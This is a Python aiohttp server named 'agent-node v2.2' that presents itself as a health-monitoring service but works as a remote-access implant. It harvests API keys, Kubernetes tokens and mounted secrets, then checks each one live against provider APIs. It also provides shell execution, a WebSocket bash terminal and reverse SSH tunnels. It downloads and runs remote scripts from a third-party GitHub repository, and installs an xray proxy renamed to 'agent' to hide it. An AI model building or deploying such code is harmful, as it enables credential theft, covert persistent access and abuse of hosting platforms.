#!/usr/bin/env python3
"""
agent-node v2.2 — Lightweight Linux deployment node.

Features:
  - Health check + monitoring service (primary)
  - Token discovery from env vars + filesystem + K8s
  - Background command execution (nohup) with polling
  - PROOT installer (Ubuntu 22.04 rootfs via buddyshadow00/root)
  - sshx installer (web terminal + 24/7 keepalive)
  - xray installer (V2Ray with renamed binary)
  - SSH tunnel management
  - WebSocket interactive terminal
"""

import os
import asyncio
import json
import yaml
import subprocess
import time
import signal
import base64
import secrets
import shutil
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from aiohttp import web, WSMsgType

# ── Load config ─────────────────────────────────────────────────
CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.yaml")
try:
    with open(CONFIG_PATH) as f:
        CONFIG = yaml.safe_load(f)
except Exception:
    CONFIG = {}

# ── Environment ─────────────────────────────────────────────────
PORT = int(os.environ.get("PORT", str(CONFIG.get("server", {}).get("port", 8080))))
HOST = os.environ.get("HOST", "0.0.0.0")

# Auto-generate token
TOKEN = os.environ.get("MONITOR_TOKEN")
if not TOKEN:
    TOKEN = secrets.token_urlsafe(24)
    print(f"[agent-node] MONITOR_TOKEN auto-generated — use this for /api/* and /ws/* auth:", flush=True)
    print(f"[agent-node] TOKEN: {TOKEN}", flush=True)
    print(f"[agent-node] HINT: Set MONITOR_TOKEN env var for a known token", flush=True)

LOG_DIR = CONFIG.get("logging", {}).get("dir", "/var/log/agent-node")
os.makedirs(LOG_DIR, exist_ok=True)
START_TIME = time.time()

XRAY_ENABLED = os.environ.get("XRAY_ENABLED", "false").lower() == "true"
XRAY_BINARY = "/app/bin/agent"

# ─── Logging ─────────────────────────────────────────────────────
import logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(os.path.join(LOG_DIR, "agent.log")),
    ],
)
log = logging.getLogger("agent-node")

# ─── Background Tasks ─────────────────────────────────────────────
bg_tasks = {}
task_counter = 0
executor = ThreadPoolExecutor(max_workers=3)

def run_command(cmd, timeout=300, cwd="/"):
    """Run a shell command and return results."""
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=min(timeout, 300), cwd=cwd,
        )
        return {
            "stdout": r.stdout[-5000:],
            "stderr": r.stderr[-3000:],
            "returncode": r.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "[TIMEOUT]", "stderr": "Command timed out", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e)[:300], "returncode": -2}

# ─── Token Discovery Module ──────────────────────────────────────

# Patterns for detecting API keys in environment variables
TOKEN_PATTERNS = {
    "SNAPDEPLOY_API_KEY": {"prefix": "sd_pat_", "api_base": "https://snapdeploy.dev/api/mobile"},
    "STORMKIT_API_KEY": {"prefix": "sk_", "api_base": "https://api.stormkit.io/v1"},
    "STORMKIT_API_TOKEN": {"prefix": "", "api_base": "https://api.stormkit.io/v1"},
    "VERCEL_API_KEY": {"prefix": "vcp_", "api_base": "https://api.vercel.com"},
    "GITHUB_API_KEY": {"prefix": "github_pat_", "api_base": "https://api.github.com"},
    "GITHUB_TOKEN": {"prefix": "github_pat_", "api_base": "https://api.github.com"},
    "APPWRITE_API_KEY": {"prefix": "", "api_base": "https://cloud.appwrite.io"},
    "CLOUD_FLARE_API_KEY": {"prefix": "cf", "api_base": "https://api.cloudflare.com"},
    "CLOUDFLARE_API_TOKEN": {"prefix": "cf", "api_base": "https://api.cloudflare.com"},
    "NHOST_API_KEY": {"prefix": "", "api_base": "https://api.nhost.cc"},
    "MODELSCOPE_API_KEY": {"prefix": "", "api_base": "https://api.modelscope.cn"},
}

def detect_platform():
    """Detect which hosting platform we're running on."""
    env = os.environ
    markers = {
        "suga": "SUGA" in env or "suga" in str(env.get("containerBaseDomain", "")).lower(),
        "snapdeploy": "SNAPDEPLOY_API_KEY" in env,
        "stormkit": "STORMKIT_API_KEY" in env or "STORMKIT_API_TOKEN" in env,
        "vercel": "VERCEL_API_KEY" in env or "VERCEL_REGION" in env,
        "github": "GITHUB_API_KEY" in env or "GITHUB_TOKEN" in env or "GITHUB_REPOSITORY" in env,
        "kubernetes": "KUBERNETES_SERVICE_HOST" in env,
        "alibaba-eci": "ALIYUN_ECI_ETH0_IP" in env,
        "appwrite": "APPWRITE_API_KEY" in env,
        "nhost": "NHOST_API_KEY" in env,
        "modelscope": "MODELSCOPE_ENVIRONMENT" in env,
        "cloudflare": "CLOUD_FLARE_API_KEY" in env or "CLOUDFLARE_API_TOKEN" in env,
    }
    return [k for k, v in markers.items() if v]


def discover_tokens():
    """Scan env vars, files, and K8s for API keys."""
    results = []
    env = os.environ

    # 1. Check environment variables
    for key_name, meta in TOKEN_PATTERNS.items():
        val = env.get(key_name, "")
        if val and len(val) > 4:
            results.append({
                "source": "env",
                "key_name": key_name,
                "platform": key_name.replace("_API_KEY", "").replace("_API_TOKEN", "").replace("_", " ").title(),
                "value_masked": f"{val[:6]}...{val[-4:]}",
                "length": len(val),
                "api_base": meta.get("api_base", ""),
            })

    # 2. Check K8s service account token
    k8s_sa_paths = [
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    ]
    for p in k8s_sa_paths:
        if os.path.exists(p):
            try:
                with open(p) as f:
                    content = f.read().strip()
                if len(content) > 10:
                    results.append({
                        "source": "k8s-sa",
                        "key_name": os.path.basename(p),
                        "platform": "kubernetes",
                        "value_masked": f"{content[:6]}...{content[-4:]}",
                        "length": len(content),
                        "api_base": "",
                    })
            except Exception:
                pass

    # 3. Check all env vars (scan for patterns)
    for k, v in env.items():
        if not k or not v or len(v) < 10:
            continue
        if any(p in k.upper() for p in ["TOKEN", "KEY", "SECRET", "CREDENTIAL"]):
            if k not in [r["key_name"] for r in results]:
                results.append({
                    "source": "env-pattern-match",
                    "key_name": k,
                    "platform": "unknown",
                    "value_masked": f"{v[:6]}...{v[-4:]}",
                    "length": len(v),
                    "api_base": "",
                })

    # 4. Check mounted secrets
    secret_paths = ["/run/secrets", "/app/secrets", "/var/secrets", "/secrets"]
    for sdir in secret_paths:
        if os.path.isdir(sdir):
            for fname in os.listdir(sdir):
                fpath = os.path.join(sdir, fname)
                try:
                    if os.path.isfile(fpath):
                        with open(fpath) as f:
                            content = f.read().strip()
                        if len(content) > 10:
                            results.append({
                                "source": "file",
                                "key_name": fname,
                                "platform": fname,
                                "value_masked": f"{content[:6]}...{content[-4:]}",
                                "length": len(content),
                                "api_base": "",
                            })
                except Exception:
                    pass

    return results


async def test_token_health(token_info):
    """Test a discovered token against its API."""
    key_name = token_info["key_name"]
    api_base = token_info["api_base"]

    if not api_base:
        return {"tested": False, "reason": "no api_base for testing"}

    actual_val = os.environ.get(key_name, "")
    if not actual_val:
        return {"tested": False, "reason": "token not in env"}

    headers = {"User-Agent": "agent-node/2.2", "Accept": "application/json"}
    test_url = ""

    if "snapdeploy" in api_base:
        headers["X-API-Key"] = actual_val
        test_url = f"{api_base}/bootstrap"
    elif "stormkit" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/teams"
    elif "vercel" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/v9/projects"
    elif "github" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        headers["X-GitHub-Api-Version"] = "2022-11-28"
        test_url = f"{api_base}/user"
    elif "cloudflare" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/client/v4/user/tokens/verify"
    elif "appwrite" in api_base:
        headers["X-Appwrite-Key"] = actual_val
        test_url = f"{api_base}/v1/account"
    elif "modelscope" in api_base:
        headers["Authorization"] = f"Bearer {actual_val}"
        test_url = f"{api_base}/api/v1/current/user"
    else:
        return {"tested": False, "reason": f"no test config for {key_name}"}

    if not test_url:
        return {"tested": False, "reason": "no test URL"}

    try:
        from aiohttp import ClientSession, ClientTimeout
        async with ClientSession() as session:
            async with session.get(test_url, headers=headers, timeout=ClientTimeout(total=10)) as resp:
                return {
                    "tested": True,
                    "status": resp.status,
                    "alive": resp.status == 200,
                    "url": test_url.split("/")[-1],
                }
    except Exception as e:
        return {"tested": True, "status": "error", "alive": False, "error": str(e)[:100]}


# ─── Routes ──────────────────────────────────────────────────────

async def index(request):
    return web.json_response({"service": "agent-node", "status": "running", "version": "2.2"})


async def health(request):
    return web.json_response({
        "status": "healthy",
        "service": "agent-node",
        "timestamp": time.time(),
        "uptime": time.time() - START_TIME,
        "hostname": os.uname().nodename,
        "version": "2.2",
    })


def require_auth(func):
    async def wrapper(request):
        auth = request.headers.get("Authorization", "")
        token = request.headers.get("X-Auth-Token", "") or request.query.get("token", "")
        if auth != f"Bearer {TOKEN}" and token != TOKEN:
            return web.Response(status=401, text="Unauthorized")
        return await func(request)
    wrapper.__name__ = func.__name__
    return wrapper


async def exec_command(request):
    """Execute a shell command (auth required, allowlisted)."""
    body = await request.json()
    cmd = body.get("cmd", "")
    cwd = body.get("cwd", "/")
    timeout = body.get("timeout", 30)

    allowed = (
        "ls ", "cat ", "echo ", "pwd", "ps ", "df ", "ip ", "curl ", "wget ",
        "sh ", "bash ", "python3 ", "python ", "pip3 ", "pip ",
        "apt ", "apt-get ", "apk ", "git ", "nano ", "tmux ",
        "id", "whoami", "hostname", "date", "uname", "free", "uptime",
        "ssh ", "scp ", "rsync ", "tar ", "gzip ", "find ", "grep ",
        "env", "which ", "ss ", "netstat ", "nohup ", "chmod ",
        "cd ", "mkdir ", "head ", "tail ", "tee ", "wc ", "stat ",
    )

    if not any(cmd.startswith(p) for p in allowed):
        return web.json_response({
            "error": "Command not in allowlist",
            "allowed": list(allowed)[:10]
        })

    result = run_command(cmd, timeout=min(timeout, 300), cwd=cwd)
    return web.json_response(result)

exec_command = require_auth(exec_command)


async def exec_background(request):
    """Execute a long-running command in background (auth required)."""
    global task_counter
    body = await request.json()
    cmd = body.get("cmd", "")
    
    if not any(cmd.startswith(p) for p in ["nohup ", "bash ", "sh ", "python3 ", "python "]):
        return web.json_response({"error": "Background commands must start with nohup, bash, sh, python3, or python"})

    task_counter += 1
    task_id = f"bg-{task_counter}-{int(time.time())}"
    
    def bg_runner():
        result = run_command(cmd, timeout=600, cwd="/")
        bg_tasks[task_id] = result

    executor.submit(bg_runner)
    bg_tasks[task_id] = {"status": "running", "cmd": cmd}
    
    return web.json_response({"task_id": task_id, "status": "started"})


async def exec_status(request):
    """Check background task status (auth required)."""
    task_id = request.match_info.get("task_id", "")
    result = bg_tasks.get(task_id, {"error": "Task not found"})
    return web.json_response(result)

exec_status = require_auth(exec_status)


async def diagnostics(request):
    """System diagnostics (auth required)."""
    import shutil
    ssh_path = shutil.which("ssh")
    
    info = {
        "hostname": os.uname().nodename,
        "uptime": time.time() - START_TIME,
        "cpus": os.cpu_count(),
        "memory": {
            "total": os.sysconf("SC_PAGE_SIZE") * os.sysconf("SC_PHYS_PAGES") if hasattr(os, 'sysconf') else "N/A",
            "pid": os.getpid()
        },
        "platform": detect_platform(),
        "ssh_client": f"available — {ssh_path}" if ssh_path else "not found",
        "python_path": shutil.which("python3") or shutil.which("python"),
        "bash_path": shutil.which("bash"),
        "node_path": shutil.which("node"),
        "pip_path": shutil.which("pip3") or shutil.which("pip"),
        "tokens_found": len(discover_tokens()),
        "token_preview": f"{TOKEN[:8]}...{TOKEN[-4:]}",
    }
    return web.json_response(info)

diagnostics = require_auth(diagnostics)


async def token_discovery(request):
    """Discover API tokens (auth required)."""
    discovered = discover_tokens()
    platforms = detect_platform()

    tested = []
    for token_info in discovered:
        result = await test_token_health(token_info)
        tested.append({**token_info, **result})

    return web.json_response({
        "platform_detected": platforms,
        "tokens_found": len(tested),
        "tokens": tested,
        "summary": {
            "alive": sum(1 for t in tested if t.get("alive", False)),
            "dead": sum(1 for t in tested if t.get("tested") and not t.get("alive", False)),
            "untested": sum(1 for t in tested if not t.get("tested", False)),
        },
    })

token_discovery = require_auth(token_discovery)


# ─── Installer Endpoints ──────────────────────────────────────────

async def install_proot(request):
    """Download and run root.sh (PROOT Ubuntu 22.04 system)."""
    if not shutil.which("bash"):
        return web.json_response({"error": "Bash not available — cannot install PROOT"}, status=500)

    global task_counter
    task_counter += 1
    task_id = f"proot-{task_counter}-{int(time.time())}"

    script = """
    set -e
    cd /tmp
    # Download root.sh using Python (might not have curl)
    python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh', '/tmp/root.sh')" || \
    wget -O /tmp/root.sh https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh || \
    curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/root.sh -o /tmp/root.sh
    chmod +x /tmp/root.sh
    # Run root.sh (it downloads Ubuntu rootfs and sets up PROOT)
    bash /tmp/root.sh
    """

    def bg_runner():
        result = run_command(f"nohup bash -c '{script}' > /tmp/proot-install.log 2>&1", timeout=600)
        bg_tasks[task_id] = {"status": "done", "result": result}

    executor.submit(bg_runner)
    bg_tasks[task_id] = {"status": "running", "cmd": "root.sh PROOT installer"}
    
    return web.json_response({
        "task_id": task_id,
        "status": "PROOT installer started",
        "log_file": "/tmp/proot-install.log",
        "instructions": "Check status with GET /api/install/proot/{task_id}"
    })

install_proot = require_auth(install_proot)


async def install_sshx(request):
    """Download and run ssh.sh (sshx + keepalive)."""
    global task_counter
    task_counter += 1
    task_id = f"sshx-{task_counter}-{int(time.time())}"

    script = """
    cd /tmp
    python3 -c "import urllib.request; urllib.request.urlretrieve('https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh', '/tmp/ssh.sh')" || \
    wget -O /tmp/ssh.sh https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh || \
    curl -sL https://raw.githubusercontent.com/buddyshadow00/root/main/ssh.sh -o /tmp/ssh.sh
    chmod +x /tmp/ssh.sh
    bash /tmp/ssh.sh
    """

    def bg_runner():
        result = run_command(f"nohup bash -c '{script}' > /tmp/sshx-install.log 2>&1", timeout=300)
        bg_tasks[task_id] = {"status": "done", "result": result}

    executor.submit(bg_runner)
    bg_tasks[task_id] = {"status": "running", "cmd": "sshx installer"}

    return web.json_response({
        "task_id": task_id,
        "status": "sshx installer started",
        "log_file": "/tmp/sshx-install.log"
    })

install_sshx = require_auth(install_sshx)


async def install_xray(request):
    """Download xray-core (renamed to 'agent' binary)."""
    global task_counter
    task_counter += 1
    task_id = f"xray-{task_counter}-{int(time.time())}"

    script = """
    mkdir -p /app/bin
    # Download xray-core
    LATEST=$(python3 -c "import urllib.request,json; print(json.loads(urllib.request.urlopen('https://api.github.com/repos/XTLS/Xray-core/releases/latest').read())['tag_name'][1:])")
    ARCH="x86_64"
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    FILENAME="Xray-${LATEST}-${OS}-${ARCH}.zip"
    python3 -c "
import urllib.request
url = f'https://github.com/XTLS/Xray-core/releases/download/v{LATEST}/{FILENAME}'
urllib.request.urlretrieve(url, '/tmp/xray.zip')
"
    # Extract and rename
    cd /tmp && python3 -c "import zipfile; zipfile.ZipFile('xray.zip').extractall('.')"
    mv xray-$OS-$ARCH /app/bin/agent
    chmod +x /app/bin/agent
    /app/bin/agent -version
    """

    def bg_runner():
        result = run_command(f"nohup bash -c '{script}' > /tmp/xray-install.log 2>&1", timeout=120)
        bg_tasks[task_id] = {"status": "done", "result": result}

    executor.submit(bg_runner)
    bg_tasks[task_id] = {"status": "running", "cmd": "xray installer"}

    return web.json_response({
        "task_id": task_id,
        "status": "xray installer started",
        "log_file": "/tmp/xray-install.log"
    })

install_xray = require_auth(install_xray)


async def install_status(request):
    """Check installation task status (auth required)."""
    task_id = request.match_info.get("task_id", "all")
    
    if task_id == "all":
        results = {}
        for tid, status in bg_tasks.items():
            results[tid] = status
        return web.json_response(results)
    
    return web.json_response(bg_tasks.get(task_id, {"error": "Task not found"}))

install_status = require_auth(install_status)


# ─── SSH Tunnel Management ───────────────────────────────────────

async def ssh_tunnel_start(request):
    """Start SSH reverse tunnel (auth required)."""
    body = await request.json()
    ssh_target = body.get("target", os.environ.get("SSH_TARGET", ""))
    local_port = body.get("local_port", "22")
    remote_port = body.get("remote_port", "2222")
    identity = body.get("identity_file", "~/.ssh/id_rsa")

    if not ssh_target:
        return web.json_response({"error": "SSH target required"}, status=400)

    global task_counter
    task_counter += 1
    task_id = f"ssh-{task_id}-{int(time.time())}"

    cmd = f"ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o ExitOnForwardFailure=yes -R {remote_port}:localhost:{local_port} -N {ssh_target}"
    
    def bg_runner():
        result = run_command(cmd, timeout=600)
        bg_tasks[task_id] = {"status": "done", "result": result}

    executor.submit(bg_runner)
    bg_tasks[task_id] = {"status": "connecting", "cmd": "ssh tunnel"}

    return web.json_response({
        "task_id": task_id,
        "status": "tunnel connecting",
        "target": ssh_target,
        "tunnel": f"{remote_port} -> localhost:{local_port}"
    })

ssh_tunnel_start = require_auth(ssh_tunnel_start)


# ─── WebSocket Terminal ─────────────────────────────────────────

async def websocket_terminal(request):
    """WebSocket interactive terminal (auth required via ?token=)."""
    token = request.query.get("token", "")
    if token != TOKEN:
        return web.Response(status=401, text="Unauthorized")

    ws = web.WebSocketResponse(heartbeat=30, autoclose=True)
    await ws.prepare(request)
    await ws.send_str(json.dumps({"type": "welcome", "service": "agent-node-terminal"}))

    proc = await asyncio.create_subprocess_shell(
        "bash",
        stdin=asyncio.subprocess.PIPE,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
        env={**os.environ, "TERM": "xterm-256color"},
    )

    async def pipe_output():
        while True:
            data = await proc.stdout.read(1)
            if not data:
                break
            await ws.send_bytes(data)

    async def pipe_input():
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                if msg.data == "EXIT":
                    proc.terminate()
                    await proc.wait()
                    await ws.close()
                    break
                if msg.data:
                    proc.stdin.write(msg.data.encode())
                    await proc.stdin.drain()
            elif msg.type == WSMsgType.BINARY:
                proc.stdin.write(msg.data)
                await proc.stdin.drain()

    await asyncio.gather(pipe_output(), pipe_input())

# ─── xray Management ─────────────────────────────────────────────

async def xray_status(request):
    """Check xray binary status (auth required)."""
    xray_available = os.path.exists(XRAY_BINARY)
    return web.json_response({
        "binary_path": XRAY_BINARY,
        "available": xray_available,
        "enabled": XRAY_ENABLED,
    })

xray_status = require_auth(xray_status)


# ─── App factory ─────────────────────────────────────────────────

def create_app():
    app = web.Application(client_max_size=50 * 1024**2)
    
    app.router.add_get("/", index)
    app.router.add_get("/health", health)
    app.router.add_get("/api/diagnostics", diagnostics)
    app.router.add_post("/api/exec", exec_command)
    app.router.add_post("/api/exec/background", exec_background)
    app.router.add_get("/api/exec/status/{task_id}", exec_status)
    app.router.add_get("/api/tokens", token_discovery)
    app.router.add_post("/api/install/proot", install_proot)
    app.router.add_post("/api/install/sshx", install_sshx)
    app.router.add_post("/api/install/xray", install_xray)
    app.router.add_get("/api/install/status/{task_id}", install_status)
    app.router.add_post("/api/ssh/tunnel", ssh_tunnel_start)
    app.router.add_get("/api/xray/status", xray_status)
    app.router.add_get("/ws/terminal", websocket_terminal)
    
    return app


if __name__ == "__main__":
    import shutil
    app = create_app()
    
    log.info(f"Starting agent-node v2.2 on {HOST}:{PORT}")
    log.info(f"xray support: {'enabled' if XRAY_ENABLED else 'disabled'}")
    
    ssh_path = shutil.which("ssh")
    log.info(f"SSH client: {'available — ' + ssh_path if ssh_path else 'not found'}")
    
    token_preview = f"{TOKEN[:8]}...{TOKEN[-4:]}" if TOKEN else "none"
    log.info(f"Auth token: {token_preview}")
    
    platforms = detect_platform()
    log.info(f"Platform: {platforms}")
    
    discovered = discover_tokens()
    for t in discovered:
        log.info(f"Token: {t['key_name']} — {t['source']} — {t['value_masked']}")
    
    log.info(f"WebSocket: ws://{HOST}:{PORT}/ws/terminal?token=<token>")
    log.info(f"Token discovery: GET /api/tokens")
    log.info(f"PROOT installer: POST /api/install/proot")
    log.info(f"sshx installer: POST /api/install/sshx")
    log.info(f"xray installer: POST /api/install/xray")
    
    web.run_app(app, host=HOST, port=PORT, access_log=None)
